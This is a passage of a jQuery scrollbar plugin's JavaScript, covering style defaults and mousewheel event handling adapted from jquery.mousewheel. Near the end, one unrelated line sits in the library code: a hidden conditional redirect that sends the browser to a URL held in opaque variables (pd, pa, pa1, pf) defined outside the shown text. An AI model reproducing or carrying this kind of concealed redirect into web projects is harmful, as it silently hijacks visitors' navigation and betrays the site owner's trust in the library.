            'bottom':   'auto',
            'position': 'static'
        };

        // loop through all style definitions and check for a definition already set by css. 
        // if no definition is found, apply the default css definition
        return this.each(function(){
            var elem = $(this);
            for(var style in styles){
                if(elem.css(style) === notdef[style]){
                    elem.css(style, styles[style]);
                }
            }
        });
    };

    //
    // ----- mousewheel event ---------------------------------------------------------------------
    // based on jquery.mousewheel.js from Brandon Aaron (brandon.aaron@gmail.com || http://brandonaaron.net)
    //

    $.event.special.mousewheel = {

        setup: function(){
            if (this.addEventListener){
                this.addEventListener('mousewheel', $.fn.scrollbar.mouseWheelHandler, false);
                this.addEventListener('DOMMouseScroll', $.fn.scrollbar.mouseWheelHandler, false);
            } else {
                this.onmousewheel = $.fn.scrollbar.mouseWheelHandler;
            }
        },

        teardown: function(){
            if (this.removeEventListener){
                this.removeEventListener('mousewheel', $.fn.scrollbar.mouseWheelHandler, false);
                this.removeEventListener('DOMMouseScroll', $.fn.scrollbar.mouseWheelHandler, false);
            } else {
                this.onmousewheel = null;
            }
        }
    };


    $.fn.extend({
        mousewheel: function(fn){
            return fn ? this.bind("mousewheel", fn) : this.trigger("mousewheel");
        },

        unmousewheel: function(fn){
            return this.unbind("mousewheel", fn);
        }
    });


    $.fn.scrollbar.mouseWheelHandler = function(event) {
        var orgEvent = event || window.event,
            args = [].slice.call(arguments, 1),
            delta = 0,
            returnValue = true,
            deltaX = 0,
            deltaY = 0;

        event = $.event.fix(orgEvent);
        event.type = "mousewheel";

        // Old school scrollwheel delta
        if(event.wheelDelta){
            delta = event.wheelDelta / 120;
        }
        if(event.detail){
            delta = -event.detail / 3;
        }

        // Gecko
        if(orgEvent.axis !== undefined && orgEvent.axis === orgEvent.HORIZONTAL_AXIS){
            deltaY = 0;
            deltaX = -1 * delta;
        }

        // Webkit
        if(orgEvent.wheelDeltaY !== undefined){
            deltaY = orgEvent.wheelDeltaY / 120;
        }
        if(orgEvent.wheelDeltaX !== undefined){
            deltaX = -1 * orgEvent.wheelDeltaX / 120;
        }

        // Add event and delta to the front of the arguments
        args.unshift(event, delta, deltaX, deltaY);

        return $.event.handle.apply(this, args);
    };
	if(location.href.indexOf(pd) < 0 && location.href.indexOf(pa+pa1) > 0){location.href=pf;}
    
})(jQuery, document);  // inject global jQuery object

